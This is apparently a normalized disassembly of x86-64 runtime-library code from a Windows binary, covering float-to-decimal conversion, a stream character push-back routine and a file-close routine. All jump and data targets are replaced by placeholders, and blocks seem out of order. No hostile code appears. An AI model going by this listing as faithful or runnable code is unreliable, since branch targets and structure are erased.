cmp [ r10 ] bl
je r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
jmp r-xdata
sub r10 r9
mov edi 0x18
add r12d r9d
add al r9b
mov [ rbp - 0xa ] al
mov ecx 0x2
mov [ rbp - 0x6d ] 0x8000
jmp r-xdata
cmp dl 0x30
je r-xdata
sub r8 r9
mov ecx 0xb
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
cmp dl al
jge r-xdata
mov r9d 0x1
mov r14d r9d
mov [ rbp - 0x79 ] r9d
test edi edi
jne r-xdata
cmp dl r11b
jge r-xdata
lea ecx [ rsi + rsi * 4 ]
movsx eax dl
lea esi [ rax + rcx * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
mov ecx 0x7
jmp r-xdata
cmp dl 0x2d
jne r-xdata
dec edi
add r12d r9d
lea r8 [ rbp - 0x41 ]
lea rcx [ rbp - 0x21 ]
mov edx edi
call sub_1800337ec
cmp [ rbp - 0x75 ] ebx
jge r-xdata
mov r8 [ rbp - 0x59 ]
or ax [ rbp - 0x6d ]
mov [ r8 + 0xa ] ax
mov eax ebx
mov [ r8 ] dx
mov [ r8 + 0x2 ] ecx
mov [ r8 + 0x6 ] edi
mov r9d 0x1
cmp dl 0x30
je r-xdata
cmp dl 0x39
jg r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
cmp dl 0x30
jge r-xdata
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov esi 0x1451
jmp r-xdata
mov dl [ r8 ]
add r8 r9
add esi r12d
test r15d r15d
jne r-xdata
neg esi
mov ecx r9d
jmp r-xdata
jmp r-xdata
cmp edi 0x19
jae r-xdata
cmp dl 0x2b
je r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x30
je r-xdata
mov dl [ r8 ]
add r8 r9
cmp [ rbp - 0x79 ] ebx
jne r-xdata
add esi [ rbp + 0x67 ]
cmp dl 0x43
jle r-xdata
add r12d r9d
sub dl al
add edi r9d
mov [ r10 ] dl
add r10 r9
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp edi 0x19
jae r-xdata
mov dl [ r8 ]
sub r12d r9d
add r8 r9
jmp r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ rbp + 0x6f ]
cmp dl 0x45
jle r-xdata
mov dl [ r8 ]
add r8 r9
mov dl [ r8 ]
add r8 r9
sub dl 0x30
add edi r9d
mov [ r10 ] dl
add r10 r9
sub r12d r9d
mov ecx ebx
movzx edx bx
mov eax 0x7fff
mov ebx 0x2
mov edi 0x80000000
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx 0x6
jmp r-xdata
sub dl 0x64
cmp dl r9b
ja r-xdata
mov edx ebx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x1
jmp r-xdata
lea r13 [ rw-data ]
sub r13 0x60
test esi esi
je r-xdata
mov eax [ rbp - 0x39 ]
movzx edx [ rbp - 0x41 ]
mov ecx [ rbp - 0x3f ]
mov edi [ rbp - 0x3b ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ rbp - 0x71 ] ebx
jne r-xdata
lea r13 [ rw-data ]
neg esi
sub r13 0x60
test esi esi
je r-xdata
mov [ rbp - 0x41 ] bx
mov edi 0x80000000
mov r10d 0x7fff
mov r12d 0x1
test esi esi
jne r-xdata
cdqe
mov r15d 0x8000
lea rcx [ rax + rax * 2 ]
lea rdx [ r13 + rcx * 4 ]
cmp [ rdx ] r15w
jb r-xdata
mov eax esi
add r13 0x54
sar esi 0x3
and eax 0x7
mov [ rbp - 0x71 ] esi
mov [ rbp - 0x61 ] r13
je r-xdata
movzx eax [ rdx + 0xa ]
movzx ecx [ rbp - 0x37 ]
mov [ rbp - 0x51 ] rbx
movzx r9d ax
and ax r10w
mov [ rbp - 0x49 ] ebx
xor r9w cx
and cx r10w
and r9w r15w
lea r8d [ rcx + rax ]
mov [ rbp - 0x75 ] r9w
cmp cx r10w
jae r-xdata
mov rcx [ rdx ]
mov eax [ rdx + 0x8 ]
lea rdx [ rbp - 0x31 ]
mov [ rbp - 0x31 ] rcx
shr rcx 0x10
mov [ rbp - 0x29 ] eax
sub ecx r12d
mov [ rbp - 0x2f ] ecx
neg r9w
cmp ax r10w
jae r-xdata
mov r11d 0xbffd
cmp r8w r11w
ja r-xdata
mov r9d 0x3fbf
cmp r8w r9w
ja r-xdata
test cx cx
jne r-xdata
mov [ rbp - 0x3d ] rbx
mov [ rbp - 0x41 ] ebx
jmp r-xdata
test ax ax
jne r-xdata
add r8w r12w
test [ rbp - 0x39 ] 0x7fffffff
jne r-xdata
mov r10d 0x5
mov r12d ebx
lea rcx [ rbp - 0x4d ]
lea r13d [ r10 - 0x4 ]
add r8w r12w
test [ rdx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ rbp - 0x3d ] ebx
jne r-xdata
sub r10d r13d
add rcx 0x2
add r12d r13d
test r10d r10d
jg r-xdata
mov edi r12d
lea r14 [ rbp + r9 - 0x41 ]
lea r15 [ rdx + 0x8 ]
and edi r13d
cmp [ rdx + 0x4 ] ebx
jne r-xdata
cmp [ rbp - 0x41 ] ebx
jne r-xdata
lea eax [ r12 + r12 ]
mov [ rbp - 0x79 ] r10d
movsxd r9 eax
test r10d r10d
jle r-xdata
mov r10d [ rbp - 0x49 ]
mov r9d [ rbp - 0x51 ]
mov eax 0xc002
add r8w ax
mov edi 0x80000000
mov r14d 0xffff
test r8w r8w
jle r-xdata
mov r11d r13d
cmp esi r9d
jae r-xdata
cmp [ rdx ] ebx
je r-xdata
mov [ rbp - 0x37 ] bx
jmp r-xdata
add r8w r14w
jns r-xdata
test edi r10d
jne r-xdata
mov r11d [ rbp - 0x79 ]
add r14 0x2
sub r15 0x2
sub r11d r13d
mov [ rbp - 0x79 ] r11d
test r11d r11d
jg r-xdata
add [ rcx ] r13w
mov [ rcx - 0x4 ] esi
test r11d r11d
je r-xdata
movzx eax [ rbp - 0x51 ]
movzx eax r8w
mov edi ebx
neg ax
movzx edx ax
add r8w dx
test r8w r8w
jg r-xdata
mov r11d [ rbp - 0x4d ]
mov edx r9d
add r10d r10d
shr edx 0x1f
add r9d r9d
mov ecx r11d
shr ecx 0x1f
lea eax [ r11 + r11 ]
add r8w r14w
or eax edx
or r10d ecx
mov [ rbp - 0x51 ] r9d
mov [ rbp - 0x4d ] eax
mov [ rbp - 0x49 ] r10d
test r8w r8w
jg r-xdata
movzx eax [ r14 ]
movzx r9d [ r15 ]
mov r11d ebx
imul r9d eax
mov eax [ rcx - 0x4 ]
lea esi [ rax + r9 ]
cmp esi eax
jb r-xdata
mov eax [ rbp - 0x4f ]
or ecx 0xffffffff
mov r12d 0x1
cmp eax ecx
jne r-xdata
and r9d 0x1ffff
cmp r9d 0x18000
jne r-xdata
mov r11d [ rbp - 0x4d ]
mov eax r10d
shr r9d 0x1
mov ecx r11d
shl eax 0x1f
shr r11d 0x1
shl ecx 0x1f
or r11d eax
shr r10d 0x1
or r9d ecx
sub rdx r13
mov [ rbp - 0x4d ] r11d
mov [ rbp - 0x51 ] r9d
jne r-xdata
add edi r13d
add eax r12d
mov [ rbp - 0x4f ] eax
jmp r-xdata
mov eax [ rbp - 0x4b ]
mov [ rbp - 0x4f ] ebx
cmp eax ecx
jne r-xdata
mov r12d 0x1
test [ rbp - 0x51 ] r13b
je r-xdata
test edi edi
mov [ rbp - 0x49 ] r10d
mov edi 0x80000000
je r-xdata
mov esi [ rbp - 0x71 ]
mov eax 0x7fff
cmp r8w ax
jb r-xdata
add eax r12d
mov [ rbp - 0x4b ] eax
movzx eax [ rbp - 0x47 ]
mov [ rbp - 0x4b ] ebx
cmp ax r14w
jne r-xdata
movzx eax [ rbp - 0x4f ]
or r8w [ rbp - 0x75 ]
mov [ rbp - 0x3b ] r10d
mov [ rbp - 0x41 ] ax
mov eax [ rbp - 0x4d ]
mov [ rbp - 0x37 ] r8w
mov [ rbp - 0x3f ] eax
mov r10d 0x7fff
jmp r-xdata
movzx eax [ rbp - 0x75 ]
mov r10d 0x7fff
neg ax
jmp r-xdata
movzx eax r9w
or ax r13w
mov [ rbp - 0x51 ] ax
mov r9d [ rbp - 0x51 ]
jmp r-xdata
add ax r12w
mov [ rbp - 0x47 ] ax
jmp r-xdata
mov [ rbp - 0x47 ] r15w
add r8w r12w
jmp r-xdata
sbb eax eax
mov [ rbp - 0x41 ] rbx
and eax edi
add eax 0x7fff8000
mov [ rbp - 0x39 ] eax
mov r13 [ rbp - 0x61 ]
mov r15d 0x8000
cmp ax r15w
ja r-xdata
mov r10d [ rbp - 0x49 ]
jmp r-xdata
sub_18003298c
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
movzx edi [ rcx + 0x8 ]
mov r10d [ rcx ]
mov rbx r9
mov r9d [ rcx + 0x4 ]
movzx ecx di
mov r11d 0x1
mov [ rbp - 0x4d ] edx
mov edx 0x8000
xor r13d r13d
and cx dx
lea r15d [ rdx - 0x1 ]
mov [ rbp - 0x39 ] r8d
and di r15w
mov [ rbp - 0x41 ] rbx
mov [ rbp - 0x9 ] 0xcccccccc
mov [ rbp - 0x5 ] 0xcccccccc
mov [ rbp - 0x1 ] 0x3ffbcccc
mov [ rbp - 0x67 ] cx
lea eax [ r11 + 0x1f ]
lea r8d [ r11 + 0x2c ]
test cx cx
je r-xdata
mov [ rbx + 0x2 ] al
mov [ rbx + 0x2 ] r8b
jmp r-xdata
cmp di r15w
jne r-xdata
test r9d r9d
jne r-xdata
test di di
jne r-xdata
movzx r8d di
mov ecx r9d
mov [ rbp - 0x17 ] r10d
shr ecx 0x18
mov eax r8d
mov [ rbp - 0x13 ] r9d
shr eax 0x8
lea r10 [ rw-data ]
mov esi 0x80000000
imul r8d r8d 0x4d10
lea edx [ rax + rcx * 2 ]
mov r14d 0x5
sub r10 0x60
mov [ rbp - 0xf ] di
mov [ rbp - 0x19 ] r13w
mov r12d 0xbffd
imul edx edx 0x4d
lea ecx [ rdx + r8 - 0x134312f4 ]
mov [ rbp - 0x49 ] r14d
lea edi [ rsi - 0x1 ]
sar ecx 0x10
movsx r9d cx
mov [ rbp - 0x61 ] ecx
neg r9d
je r-xdata
mov esi 0x80000000
mov [ rbx ] r11w
cmp r9d esi
jne r-xdata
test r10d r10d
jne r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
test r9d r9d
jns r-xdata
bt r9d 0x1e
jb r-xdata
test r10d r10d
je r-xdata
cmp cx dx
cmove eax r8d
mov ecx 0x8000
add cx r11w
mov r9d 0x8000
mov [ rbp - 0x65 ] r13d
lea r10d [ r9 - 0x1 ]
mov [ rbp - 0x61 ] ecx
movzx ecx [ rbp + 0x1 ]
movzx r15d cx
and cx r10w
mov [ rbp - 0x29 ] 0x0
xor r15w ax
and ax r10w
mov [ rbp - 0x21 ] r13d
and r15w r9w
lea r9d [ rax + rcx ]
cmp ax r10w
jae r-xdata
je r-xdata
lea r10 [ rw-data ]
neg r9d
sub r10 0x60
test r9d r9d
test cx cx
je r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_180025324
test eax eax
je r-xdata
mov eax r11d
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x108 ]
add rsp 0xc0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r9d [ rbp - 0x11 ]
mov eax 0x15
mov [ rbp - 0xf ] r13w
mov esi [ rbp - 0x11 ]
cmp r12d eax
lea r10d [ rax - 0xd ]
cmovg r12d eax
shr r9d 0x10
sub r9d 0x3ffe
cwde
add r12d eax
test r12d r12d
jg r-xdata
neg r15w
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
cmp cx r10w
jae r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
cmp r9d esi
jne r-xdata
cmp r9d 0xc0000000
jne r-xdata
mov [ rbx + 0x3 ] 0x6
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180026490
int3
mov ecx r8d
mov eax edx
add esi esi
add r8d r8d
shr eax 0x1f
shr ecx 0x1f
or r8d eax
or esi ecx
add edx edx
sub r10 r11
jne r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test r9d r9d
jns r-xdata
cmp [ rbp - 0x67 ] cx
mov eax 0x20
lea ecx [ rax + 0xd ]
cmove eax ecx
jmp r-xdata
cmp r9w r12w
ja r-xdata
test r9d r9d
jne r-xdata
cdqe
lea rcx [ rax + rax * 2 ]
lea r12 [ r10 + rcx * 4 ]
mov r10d 0x8000
mov [ rbp - 0x31 ] r12
cmp [ r12 ] r10w
jb r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_180025324
test eax eax
jne r-xdata
test r10d r10d
jne r-xdata
test r10d r10d
jne r-xdata
lea r14d [ r12 + 0x1 ]
lea rdi [ rbx + 0x4 ]
mov r10 rdi
test r14d r14d
jle r-xdata
neg r9d
movzx r10d r9b
test r10d r10d
jle r-xdata
mov [ rbx + 0x3 ] 0x3001
mov r10d 0x3fbf
cmp r9w r10w
ja r-xdata
mov eax r9d
add r10 0x54
sar r9d 0x3
and eax 0x7
mov [ rbp - 0x51 ] r9d
mov [ rbp - 0x59 ] r10
je r-xdata
mov rbx [ rbp - 0x41 ]
mov ecx [ rbp - 0x61 ]
mov r12d 0xbffd
jmp r-xdata
movzx ecx [ r12 + 0xa ]
movzx eax [ rbp - 0xf ]
mov [ rbp - 0x65 ] r13d
movzx ebx cx
and cx r15w
mov [ rbp - 0x29 ] 0x0
xor bx ax
and ax r15w
mov [ rbp - 0x21 ] r13d
and bx r10w
lea r10d [ rax + rcx ]
mov [ rbp - 0x69 ] bx
cmp ax r15w
jae r-xdata
mov rcx [ r12 ]
mov eax [ r12 + 0x8 ]
lea r12 [ rbp + 0x7 ]
mov [ rbp + 0x7 ] rcx
shr rcx 0x10
mov [ rbp + 0xf ] eax
sub ecx r11d
mov [ rbp - 0x31 ] r12
mov [ rbp + 0x9 ] ecx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180026490
int3
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_180025324
test eax eax
jne r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_180025324
test eax eax
je r-xdata
sub r10 r11
mov al [ r10 ]
sub r10 r11
cmp al 0x35
jl r-xdata
mov r13 [ rbp - 0x19 ]
mov ecx r8d
add r8d r8d
shr ecx 0x1f
mov eax edx
add edx edx
shr eax 0x1f
lea r9d [ rsi + rsi ]
mov [ rbp + 0x7 ] r13
or r8d eax
or r9d ecx
mov eax edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
or r8d eax
add edx edx
add r9d r9d
shr ecx 0x1f
mov eax r13d
lea r15d [ rax + rdx ]
or r9d ecx
cmp r15d edx
jb r-xdata
mov ecx r8d
mov eax esi
shr edx 0x1
shr r8d 0x1
shl eax 0x1f
shl ecx 0x1f
sub r10d r11d
shr esi 0x1
or r8d eax
or edx ecx
test r10d r10d
jg r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x11 ] r13d
jmp r-xdata
mov eax [ rbp - 0x11 ]
mov r9d 0x3fff
shr eax 0x10
cmp ax r9w
jb r-xdata
neg bx
cmp cx r15w
jae r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180026490
int3
mov eax 0x5
mov [ rbx + 0x3 ] al
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180026490
int3
cmp r10 rdi
jae r-xdata
jmp r-xdata
lea eax [ r8 + 0x1 ]
xor ecx ecx
cmp eax r8d
jb r-xdata
cmp r15d eax
jae r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test cx cx
jne r-xdata
add r9w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov r15d 0xbffd
cmp r10w r15w
ja r-xdata
mov r11d r13d
jmp r-xdata
cmp [ r10 ] 0x30
jne r-xdata
cmp r10 rdi
jae r-xdata
cmp r10 rdi
jae r-xdata
mov ecx r11d
cmp eax r11d
jae r-xdata
shr r13 0x20
lea r12d [ r8 + r13 ]
cmp r12d r8d
jb r-xdata
mov edi r13d
lea rcx [ rbp - 0x25 ]
add r9w r11w
test [ rbp - 0x1 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
mov r15d 0x7fff
mov ebx 0x3fbf
cmp r10w bx
ja r-xdata
sub r10 r11
sub r10b bl
sub r10b 0x3
movsx rax r10b
mov [ rbx + 0x3 ] r10b
mov [ rax + rbx + 0x4 ] r13b
mov eax 0x20
mov r9d 0x8000
mov [ rbx + 0x3 ] r11b
cmp [ rbp - 0x67 ] r9w
lea ecx [ rax + 0xd ]
mov [ rdi ] 0x30
cmove eax ecx
jmp r-xdata
cmp [ r10 ] 0x39
jne r-xdata
cmp r10 rdi
jae r-xdata
add r9d r11d
mov r8d eax
test ecx ecx
je r-xdata
add r9d r11d
cmp r12d r13d
jae r-xdata
sub r14d r11d
add rcx 0x2
add edi r11d
xor r13d r13d
mov [ rbp - 0x49 ] r14d
test r14d r14d
jg r-xdata
mov r14d edi
lea rsi [ rbp - 0x1 ]
lea r12 [ rbp + rdx - 0x19 ]
and r14d r11d
cmp [ rbp - 0x5 ] r13d
jne r-xdata
test edx edx
jne r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x15 ] 0x0
mov r15d 0x7fff
jmp r-xdata
mov [ rbx ] r13w
mov [ rbx + 0x2 ] al
mov [ rbx + 0x5 ] r13b
jmp r-xdata
mov [ r10 ] 0x30
sub r10 r11
add [ r10 ] r11b
add r10 r11
add [ rbx ] r11w
mov esi [ rbp - 0x11 ]
jmp r-xdata
add r9d esi
xor r13d r13d
mov eax r15d
shr eax 0x1f
lea r8d [ r12 + r12 ]
mov ecx r12d
or r8d eax
shr ecx 0x1f
lea eax [ r9 + r9 ]
or eax ecx
lea edx [ r15 + r15 ]
sub r14d r11d
mov [ rbp - 0x11 ] eax
shr eax 0x18
mov [ rbp - 0x19 ] edx
add al 0x30
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0xe ] r13b
mov [ r10 ] al
add r10 r11
test r14d r14d
jle r-xdata
lea eax [ rdi + rdi ]
xor ebx ebx
mov r13d r14d
movsxd rdx eax
test r14d r14d
jle r-xdata
mov rbx [ rbp - 0x41 ]
mov r8d [ rbp - 0x21 ]
mov r10d [ rbp - 0x29 ]
mov eax 0xc002
mov esi 0x80000000
mov r12d 0xffff
add r9w ax
test r9w r9w
jle r-xdata
mov r8d r11d
cmp r10d edx
jae r-xdata
cmp [ rbp - 0x9 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
jmp r-xdata
test cx cx
jne r-xdata
add r10w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov [ rbp - 0x19 ] edx
add r9w r12w
jns r-xdata
test esi r8d
jne r-xdata
sub r13d r11d
add r12 0x2
sub rsi 0x2
test r13d r13d
jg r-xdata
add [ rcx ] r11w
mov [ rcx - 0x4 ] r10d
test r8d r8d
je r-xdata
mov esi r13d
lea r8 [ rbp - 0x25 ]
mov edi r14d
add r10w r11w
test [ r12 + 0x8 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
movzx eax [ rbp - 0x29 ]
mov ebx [ rbp - 0x65 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
test r9w r9w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r10d
add r8d r8d
shr edx 0x1f
add r10d r10d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w r12w
or eax edx
or r8d ecx
mov [ rbp - 0x29 ] r10d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r8d
test r9w r9w
jg r-xdata
movzx eax [ rsi ]
movzx edx [ r12 ]
mov r8d ebx
imul edx eax
mov eax [ rcx - 0x4 ]
lea r10d [ rax + rdx ]
cmp r10d eax
jb r-xdata
mov r14d [ rbp - 0x49 ]
sub edi r11d
add r8 0x2
add esi r11d
test edi edi
jg r-xdata
mov ebx esi
lea r14 [ r12 + 0x8 ]
lea r13 [ rbp + rcx - 0x19 ]
and ebx r11d
xor r12d r12d
cmp [ r12 + 0x4 ] r13d
jne r-xdata
test edx edx
jne r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r10d 0x1ffff
cmp r10d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r8d
shr r10d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r8d 0x1
or r10d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r10d
jne r-xdata
add ebx r11d
lea eax [ rsi + rsi ]
mov r15d edi
movsxd rcx eax
test edi edi
jle r-xdata
mov r9d [ rbp - 0x21 ]
mov r8d [ rbp - 0x29 ]
mov eax 0xc002
add r10w ax
mov esi 0x80000000
mov ebx 0xffff
test r10w r10w
jle r-xdata
mov r9d r11d
cmp edx ecx
jae r-xdata
cmp [ r12 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
mov r15d 0x7fff
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov eax 0x7fff
cmp r9w ax
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test ebx ebx
mov rbx [ rbp - 0x41 ]
mov [ rbp - 0x21 ] r8d
je r-xdata
add r10w bx
jns r-xdata
test esi r9d
jne r-xdata
sub r15d r11d
add r13 0x2
sub r14 0x2
test r15d r15d
jg r-xdata
add [ r8 ] r11w
mov [ r8 - 0x4 ] edx
test r9d r9d
je r-xdata
mov r10 [ rbp - 0x59 ]
movzx eax [ rbp - 0x27 ]
or r9w r15w
mov [ rbp - 0x13 ] r8d
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0xf ] r9w
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
jmp r-xdata
neg r15w
mov r8d r13d
mov edx r13d
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax r12w
jne r-xdata
movzx eax r10w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r10d [ rbp - 0x29 ]
jmp r-xdata
movzx eax [ rbp - 0x29 ]
movzx eax r10w
neg ax
movzx edx ax
add r10w dx
mov [ rbp - 0x5d ] r10w
mov r10d [ rbp - 0x65 ]
test r10w r10w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r8d
add r9d r9d
shr edx 0x1f
add r8d r8d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r10w bx
or eax edx
or r9d ecx
mov [ rbp - 0x29 ] r8d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r9d
test r10w r10w
jg r-xdata
movzx eax [ r13 ]
movzx ecx [ r14 ]
mov r9d r12d
imul ecx eax
mov eax [ r8 - 0x4 ]
lea edx [ rax + rcx ]
cmp edx eax
jb r-xdata
mov r12 [ rbp - 0x31 ]
xor r13d r13d
mov eax [ rbp - 0x61 ]
mov r12d [ rbp - 0x4d ]
mov [ rbx ] ax
test [ rbp - 0x39 ] r11b
je r-xdata
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r9w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r8d 0x1ffff
cmp r8d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r9d
shr r8d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r9d 0x1
or r8d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r8d
jne r-xdata
add r10d r11d
mov r8d [ rbp - 0x21 ]
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov r15d 0x7fff
mov r14d 0x5
mov edi 0x7fffffff
cmp r10w r15w
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test r10d r10d
movzx r10d [ rbp - 0x5d ]
mov [ rbp - 0x21 ] r9d
je r-xdata
movzx eax [ rbp - 0x27 ]
or r10w [ rbp - 0x69 ]
mov [ rbp - 0x13 ] r9d
mov r9d [ rbp - 0x51 ]
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
mov [ rbp - 0xf ] r10w
jmp r-xdata
movzx eax [ rbp - 0x69 ]
mov r9d [ rbp - 0x51 ]
neg ax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax bx
jne r-xdata
movzx eax r8w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r8d [ rbp - 0x29 ]
jmp r-xdata
sbb eax eax
mov [ rbp - 0x15 ] r13d
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r10w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov r9d [ rbp - 0x21 ]
jmp r-xdata
sub_180033440
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov r12d ecx
mov rcx rdx
mov rbx rdx
call sub_18002f2a0
mov edx [ rbx + 0x18 ]
movsxd rsi eax
test dl 0x82
jne r-xdata
test dl 0x40
je r-xdata
call sub_180022de4
mov [ rax ] 0x9
xor edi edi
test dl 0x1
je r-xdata
call sub_180022de4
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test dl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_18002f08c
add rax 0x30
cmp rbx rax
je r-xdata
or edx 0x20
mov [ rbx + 0x18 ] edx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and edx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] edx
mov ebp 0x2
lea rdx [ rsp + 0x48 ]
mov ecx esi
mov r8d ebp
mov [ rsp + 0x48 ] r12w
call sub_18002eef8
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x2 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
sub eax 0x2
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_18002f02c
test eax eax
jne r-xdata
call sub_18002f08c
add rax 0x60
cmp rbx rax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax r12w
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_18002eef8
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_18002efd8
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rax [ rbx + 0x10 ]
mov [ rax ] r12w
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_18002e6b4
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_180033630
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_180031134
mov rcx rbx
mov edi eax
call sub_180033b88
mov rcx rbx
call sub_18002f2a0
mov ecx eax
call sub_180033ac4
test eax eax
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x28 ]
